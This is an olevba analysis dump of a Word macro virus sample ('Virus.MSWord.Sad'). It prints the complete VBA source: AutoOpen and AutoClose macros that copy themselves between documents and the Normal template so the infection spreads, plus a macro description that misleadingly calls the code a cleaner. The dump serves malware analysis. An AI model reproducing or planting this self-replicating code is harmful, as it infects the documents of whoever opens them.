olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sad-6b8de5a019dfc9d54a589c345da305d96bb59dce
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sad-6b8de5a019dfc9d54a589c345da305d96bb59dce - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Sad-6b8de5a019dfc9d54a589c345da305d96bb59dce - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Micro$
Dim Logic$
    On Error GoTo -1: On Error GoTo Abort
    
            Micro$ = WordBasic.[FileName$]()

           
            Logic$ = Micro$ + ":AutoOpen"
            WordBasic.MacroCopy Logic$, "Global:Module1"

            Logic$ = Micro$ + ":Sad"
            WordBasic.MacroCopy Logic$, "Global:AutoClose"

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sad.bas 
in file: Virus.MSWord.Sad-6b8de5a019dfc9d54a589c345da305d96bb59dce - OLE stream: 'Macros/VBA/Sad'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VClose.MAIN"
Dim Micro$
Dim Logic$
    On Error GoTo -1: On Error GoTo Abort

        WordBasic.FileSaveAs Format:=1

        Micro$ = WordBasic.[FileName$]()

        Logic$ = Micro$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:Module1", Logic$

        Logic$ = Micro$ + ":Sad"
        WordBasic.MacroCopy "Global:AutoClose", Logic$

        WordBasic.FileSaveAs Format:=1

Abort:
End Sub
Public Sub Logic()
Rem I am not a Genius ;-)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

